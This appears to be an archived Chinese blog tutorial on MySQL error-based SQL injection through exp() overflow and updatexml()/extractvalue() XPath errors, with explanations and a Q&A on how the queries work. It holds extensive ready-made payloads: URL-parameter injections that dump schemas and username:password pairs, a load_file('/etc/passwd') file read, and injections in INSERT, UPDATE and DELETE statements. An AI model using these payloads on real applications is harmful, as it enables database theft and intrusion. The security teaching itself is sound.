---
title: "Error-Based SQL Injection: Three Mechanisms Explained"
title_zh: "三种常见报错注入：原理与疑问拆解"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: 3 Common Types of Error-SQL Injection
date: 2020-07-12 17:30:00
slug: 3-Common-Error-SQL-Injection
permalink: writing/3-Common-Error-SQL-Injection/
topic: Application security
summary: "Examining overflow and XML errors, subquery aliases and version-dependent behavior."
summary_zh: "围绕指数溢出与两类XML函数错误解释报错注入，专门拆解子查询别名、取反和虚拟表等容易混淆的细节，并列出版本范围、示例及常见疑问。"
format_label: Technical notes
featured_rank: 0
missing_images: 2
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## exp()

### 原理概述

> 当传递一个大于709的值时，`函数exp()`就会引起一个溢出错误
>
> 适用版本：5.5.5~5.5.49

对于数据较大的次方，其次方每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错
故，当传递一个大于709的值时，函数exp()就会引起一个重叠错误。

如图：可以很明显的看到溢出错误

![历史配图暂缺](redacted-image:missing)

在`MySQL`中，`exp`与`ln`和`log`的功能相反，也就是`log`和`ln`都返回以e为底数的对数,而`exp()`即为以e为底的对数函数，如图进行换算：

![历史配图暂缺](redacted-image:missing)

### 常见payload

```csharp
------------------------------------------------------------------------
select exp(~(select * from(select database())a));
------------------------------------------------------------------------

------------------------------------------------------------------------
and exp(~(select * from (select user () ) a) );
------------------------------------------------------------------------

------------------------------------------------------------------------
select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));//表名
------------------------------------------------------------------------

------------------------------------------------------------------------
select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));//列名
------------------------------------------------------------------------

------------------------------------------------------------------------
select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));//值
------------------------------------------------------------------------

------------------------------------------------------------------------
exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))//从当前的上下文中dump出所有的tables与columns
------------------------------------------------------------------------

------------------------------------------------------------------------
select exp(~(select*from(select load_file('/etc/passwd'))a)); //读取文件
------------------------------------------------------------------------

------------------------------------------------------------------------
insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'Eyre');//Injection in Insert

ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
-------------------------------------------------------------------------

------------------------------------------------------------------------
insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');//DIOS查询

ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
newdb::users::id
newdb::users::username
newdb::users::password' from dual)))'
--------------------------------------------------------------------------

------------------------------------------------------------------------
update users set password='Peter' ^ exp(~(select*from(select user())x)) where id=4;// Injection in Update

ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
-------------------------------------------------------------------------

------------------------------------------------------------------------
delete from users where id='1' | exp(~(select*from(select user())x));//Injection in Delete

ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
--------------------------------------------------------------------------
```

### 常见问题汇总

1、a或x代表什么?

a或x可以是任意的字母,代表的是查询返回的值组成一个集合，这个集合的名字为a或x或其他的,

2、~是什么意思?

当涉及到注入时，我们使用否定查询来造成“`DOUBLE value is out of range`”的错误。

将0按位取反就会返回“`18446744073709551615`”，再加上函数成功执行后返回0的

缘故，我们将成功执行的函数取反就会得到最大的无符号`BIGINT`值。

```mysql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec) 


mysql> select ~(select version());
+----------------------+
| ~(select version())  |
+----------------------+
| 18446744073709551610 |
+----------------------+
1 row in set, 1 warning (0.00 sec)
```

我们通过子查询与按位求反，造成一个`DOUBLE overflow error`，并借由此注出数据。

故~代表取反符号,取反原因见上

3、exp如果嵌套，那么执行顺序是什么？

拿``exp(~(select * from(select user())a))`举例`

- 先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a
- 然后 再 select * from a 查询a ,将 结果集a 全部查询出来

‘

4、select *from a ,如果a为root@localhost，那么语句变为select* from root@localhsot?没有root@localhost表怎么办?

做如下实验：

```mysql
>`exp(~(select*from(select user())x))`

    mysql> select exp(~(select*from(select user())x));
    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
```

我们会发现会返回`exp(~((select 'root@localhost' from dual)))`这便是通过子查询与按位求反，从而报错注出数据``root@localhost`

dual是一个虚拟表，用来构成select的语法规则，即虚拟表为了满足形如``select ...from .....;``格式
比如
`select 'root@localhost' from dual;`

> **oracle保证dual里面永远只有一条记录**
>
> 数据库中都存在dual表，只是mysql中的dual表没有值select * from dual 这种语句会报错，而在Oracle中会返回一行记录（dual表有一条默认值），二者都可以用dual来满足语法结构。

## updatexml()

### 原理概述

适用版本: 5.1.5+

> UPDATEXML (XML_document, XPath_string, new_value);
> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
> 第二个参数：XPath_string (Xpath格式的字符串) ，[了解Xpath语法](https://www.jb51.net/article/125607.htm)
> 第三个参数：new_value，String格式，替换查找到的符合条件的数据
>
> 作用：改变文档中符合条件的节点的值
> 改变XML_document中符合XPATH_string的值
> 而我们的注入语句为：
> updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
> 其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
> ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'
>
> 另外，updatexml最多只能显示32位，需要配合SUBSTR使用。

前后添加~使其不符合xpath格式从而报错。

我们通常在第二个xpath参数填写我们要查询的内容。

与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。

### 常见payload

```mysql
updatexml(1,concat(0x7e,(select user()),0x7e),1)

updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。


爆数据库版本信息：
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

链接用户：
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

链接数据库：
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

爆库：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)

爆表：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)

or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))

爆字段：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)

or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name='users' limit 0,1)))

爆字段内容：
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)

or extractvalue(1, concat(0x7e, (select concat_ws(':', username, password) from users limit 0,1))) or ''



```

## extractvalue()

### 原理概述

适用版本: 5.1.5+

> extractvalue()：从目标XML中返回包含所查询值的字符串
> extractvalue (XML_document, XPath_string)
> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
> 第二个参数：XPath_string (Xpath格式的字符串)
> extractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。

### 常见payload

````mysql
and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));

and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
````
